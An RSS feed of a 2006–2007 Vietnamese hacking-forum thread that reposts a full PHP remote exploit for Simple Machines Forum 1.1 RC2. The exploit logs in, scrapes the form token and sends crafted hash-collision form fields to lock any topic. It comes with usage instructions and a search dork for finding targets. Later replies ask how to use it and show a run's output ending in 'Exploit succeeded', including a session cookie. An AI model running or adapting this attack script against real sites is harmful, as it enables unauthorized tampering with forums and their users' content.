<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Simple Machines Forum (1.1 rc2 Lock Topics Remote Exploit)"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "Simple Machines Forum (1.1 rc2 Lock Topics Remote Exploit)"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Simple Machines Forum (1.1 rc2 Lock Topics Remote Exploit)</title>
				<description><![CDATA[ <b>Simple Machines Forum &lt;= 1.1 rc2 Lock Topics Remote Exploit (windows)</b>
<span class="link"> _http://milw0rm.com/exploits/2243</span>
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
print_r&#40;'
--------------------------------------------------------------------------------
Simple Machines Forum &lt;= 1.1.RC2 "lock"/Zend_Hash_Del_Key_Or_Index Vulnerability
by rgod rgod@autistici.org
site:<span class="link"> http://retrogod.altervista.org</span>
dork, version specific: "Powered by SMF"
--------------------------------------------------------------------------------
'&#41;;

if &#40;$argc&lt;6&#41; {
print_r&#40;'
--------------------------------------------------------------------------------
Usage: php ".$argv&#91;0&#93;." host path user pass topic OPTIONS
host:       target server &#40;ip/hostname&#41;
path:       path to SMF
user/pass:  u need a valid user account
lock:       topic u want to lock
Options:
   -p&#91;port&#93;:    specify a port other than 80
   -P&#91;ip:port&#93;: specify a proxy
Examples:
php ".$argv&#91;0&#93;." localhost /smf/ user pass 4
php ".$argv&#91;0&#93;." localhost /smf/ user pass 3 -p81
php ".$argv&#91;0&#93;." localhost / user pass 7 -P1.1.1.1:80
--------------------------------------------------------------------------------
'&#41;;
die;
}

error_reporting&#40;0&#41;;
ini_set&#40;"max_execution_time",0&#41;;
ini_set&#40;"default_socket_timeout",5&#41;;

function quick_dump&#40;$string&#41;
{
  $result='';$exa='';$cont=0;
  for &#40;$i=0; $i&lt;=strlen&#40;$string&#41;-1; $i++&#41;
  {
   if &#40;&#40;ord&#40;$string&#91;$i&#93;&#41; &lt;= 32 &#41; | &#40;ord&#40;$string&#91;$i&#93;&#41; &gt; 126 &#41;&#41;
   {$result.="  .";}
   else
   {$result.="  ".$string&#91;$i&#93;;}
   if &#40;strlen&#40;dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;&#41;==2&#41;
   {$exa.=" ".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
   else
   {$exa.=" 0".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
   $cont++;if &#40;$cont==15&#41; {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '&#40;\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b&#41;';
function sendpacketii&#40;$packet&#41;
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if &#40;$proxy==''&#41; {
    $ock=fsockopen&#40;gethostbyname&#40;$host&#41;,$port&#41;;
    if &#40;!$ock&#41; {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match&#40;$proxy_regex,$proxy&#41;;
    if &#40;!$c&#41; {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode&#40;':',$proxy&#41;;
    echo "Connecting to ".$parts&#91;0&#93;.":".$parts&#91;1&#93;." proxy...\r\n";
    $ock=fsockopen&#40;$parts&#91;0&#93;,$parts&#91;1&#93;&#41;;
    if &#40;!$ock&#41; {
      echo 'No response from proxy...';die;
	}
  }
  fputs&#40;$ock,$packet&#41;;
  if &#40;$proxy==''&#41; {
    $html='';
    while &#40;!feof&#40;$ock&#41;&#41; {
      $html.=fgets&#40;$ock&#41;;
    }
  }
  else {
    $html='';
    while &#40;&#40;!feof&#40;$ock&#41;&#41; or &#40;!eregi&#40;chr&#40;0x0d&#41;.chr&#40;0x0a&#41;.chr&#40;0x0d&#41;.chr&#40;0x0a&#41;,$html&#41;&#41;&#41; {
      $html.=fread&#40;$ock,1&#41;;
    }
  }
  fclose&#40;$ock&#41;;
  #debug
  #echo "\r\n".$html;
}
function my_encode&#40;$my_string&#41;
{
  $encoded="";
  for &#40;$k=0; $k&lt;=strlen&#40;$my_string&#41;-1; $k++&#41;
  {
    $encoded.="chr&#40;".ord&#40;$my_string&#91;$k&#93;&#41;;
    if &#40;$k==strlen&#40;$my_string&#41;-1&#41; {$encoded.="&#41;";}
    else {$encoded.="&#41;.";}
  }
  return $encoded;
}

function make_seed&#40;&#41;
{
   list&#40;$usec, $sec&#41; = explode&#40;' ', microtime&#40;&#41;&#41;;
   return &#40;float&#41; $sec + &#40;&#40;float&#41; $usec * 100000&#41;;
}

$host=$argv&#91;1&#93;;
$path=$argv&#91;2&#93;;
$user=$argv&#91;3&#93;;
$pass=$argv&#91;4&#93;;
$topic=&#40;int&#41;$argv&#91;5&#93;;
$port=80;
$proxy="";

for &#40;$i=3; $i&lt;=$argc-1; $i++&#41;{
$temp=$argv&#91;$i&#93;&#91;0&#93;.$argv&#91;$i&#93;&#91;1&#93;;
if &#40;&#40;$temp&lt;&gt;"-p"&#41; and &#40;$temp&lt;&gt;"-P"&#41;&#41;
{$cmd.=" ".$argv&#91;$i&#93;;}
if &#40;$temp=="-p"&#41;
{
  $port=str_replace&#40;"-p","",$argv&#91;$i&#93;&#41;;
}
if &#40;$temp=="-P"&#41;
{
  $proxy=str_replace&#40;"-P","",$argv&#91;$i&#93;&#41;;
}
}
if &#40;&#40;$path&#91;0&#93;&lt;&gt;'/'&#41; or &#40;$path&#91;strlen&#40;$path&#41;-1&#93;&lt;&gt;'/'&#41;&#41; {echo 'Error... check the path!'; die;}
if &#40;$proxy==''&#41; {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data="user=".urlencode&#40;$user&#41;;
$data.="&passwrd=".urlencode&#40;$pass&#41;;
$data.="&cookielength=-1";
$data.="&hash_passwrd=";
$data.="&submit=Login";
$packet ="POST ".$p."index.php?action=login2 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 6.0; Windows NT 5.1; SV1&#41;\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
$temp=explode&#40;"Set-Cookie: ",$html&#41;;
$cookie="";
for &#40;$i=1; $i&lt;count&#40;$temp&#41;; $i++&#41;
{
$temp2=explode&#40;" ",$temp&#91;$i&#93;&#41;;
$cookie.=" ".$temp2&#91;0&#93;;
}
echo "cookie -&gt; ".$cookie."\r\n";
$temp=explode&#40;"PHPSESSID=",$cookie&#41;;
$temp2=explode&#40;";",$temp&#91;1&#93;&#41;;
$sessid=$temp2&#91;0&#93;;
echo "sessid -&gt; ".$sessid."\r\n";
$temp=explode&#40;";member=",$html&#41;;
$temp2=explode&#40;"\n",$temp&#91;1&#93;&#41;;
$uid=&#40;int&#41;$temp2&#91;0&#93;;
echo "user id -&gt; ".$uid."\r\n";

$packet="GET ".$p."index.php?action=post;topic=$topic.0;num_replies=1 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 6.0; Windows NT 5.1; SV1&#41;\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
$temp=explode&#40;'name="sc" value="',$html&#41;;
$temp2=explode&#40;"\"",$temp&#91;1&#93;&#41;;
$sc=$temp2&#91;0&#93;;
echo "sc code -&gt; ".$sc."\r\n";
$temp=explode&#40;'"num_replies" value="',$html&#41;;
$temp2=explode&#40;"\"",$temp&#91;1&#93;&#41;;
$replies=$temp2&#91;0&#93;;
echo "num replies -&gt; ".$replies."\r\n";

$hash_1="173250926";
$hash_2="266332046";

$data='-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="topic"

'.$topic.'
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="subject"

I totally disagree, locked.
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="icon"

xx
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="message"

I totally disagree, locked.
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="notify"

0
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="lock"

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="'.$hash_1.'"

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="'.$hash_2.'"

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="sticky"

0
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="move"

0
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="attachment&#91;&#93;"; filename=""
Content-Type: application/octet-stream


-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="post"

Post
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="num_replies"

'.$replies.'
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="additional_options"

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="sc"

'.$sc.'
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="seqnum"

0
-----------------------------7d61bcd1f033e--
';

$packet="POST ".$p."index.php?action=post2;start=3;board=".$board." HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="X-FORWARDED-FOR: 1.1.1.1\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."index.php?action=post;topic=1.0;num_replies=0\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 6.0; Windows NT 5.1; SV1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: ".$cookie."\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;

$packet= "GET ".$p."index.php?action=post;topic=$topic.0;num_replies=1 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 6.0; Windows NT 5.1; SV1&#41;\r\n";
$packet.="X-FORWARDED-FOR: 1.1.1.1\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
if  &#40;strstr&#40;$html,"This topic is locked"&#41;&#41; {echo "Exploit succeeded...";}
else {echo "Exploit failed...";}
?&gt;</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3079.html#17284</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/3079.html#17284</link>
				<pubDate><![CDATA[Wed, 23 Aug 2006 10:35:42]]> GMT</pubDate>
				<author><![CDATA[ DaoDuyHieu]]></author>
			</item>
			<item>
				<title>Simple Machines Forum (1.1 rc2 Lock Topics Remote Exploit)</title>
				<description><![CDATA[ Bác ơi sử dụng cái này như thế nào ạ . Xin lỗi vì em là newbie]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3079.html#59449</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/3079.html#59449</link>
				<pubDate><![CDATA[Tue, 15 May 2007 22:59:17]]> GMT</pubDate>
				<author><![CDATA[ heroesT_T]]></author>
			</item>
			<item>
				<title>Simple Machines Forum (1.1 rc2 Lock Topics Remote Exploit)</title>
				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>X-Powered-By: PHP/4.4.7
Content-type: text/html

 
 --------------------------------------------------------------------------------
 Simple Machines Forum &lt;= 1.1.RC2 "lock"/Zend_Hash_Del_Key_Or_Index Vulnerability
 by rgod &lt;a href="mailto:rgod@autistici.org"&gt;rgod@autistici.org&lt;/a&gt;
 site:<span class="link"> http://retrogod.altervista.org</span>
 dork, version specific: "Powered by SMF"
 --------------------------------------------------------------------------------
 cookie -&gt;  PHPSESSID=e2a6636da00607172259aace4d4c176c; SMFCookie10=a%3A4%3A%7Bi%3A0%3Bs%3A3%3A%22274%22%3Bi%3A1%3Bs%3A40%3A%22819cbe529e994c6e82f8f565c1f744e3bf9490c8%22%3Bi%3A2%3Bi%3A1368598931%3Bi%3A3%3Bi%3A0%3B%7D;
sessid -&gt; e2a6636da00607172259aace4d4c176c
user id -&gt; 0
sc code -&gt; 
num replies -&gt; 
Exploit succeeded...</pre>
		</div>
thấy nó báo succes mà trả bít là lock topic nào ,thử mãi thấy mỗi topic giá trị 1 là succes còn trả được thằng nào ,ghét thật. :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3079.html#59791</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/3079.html#59791</link>
				<pubDate><![CDATA[Thu, 17 May 2007 15:24:54]]> GMT</pubDate>
				<author><![CDATA[ mechk]]></author>
			</item>
	</channel>
</rss>
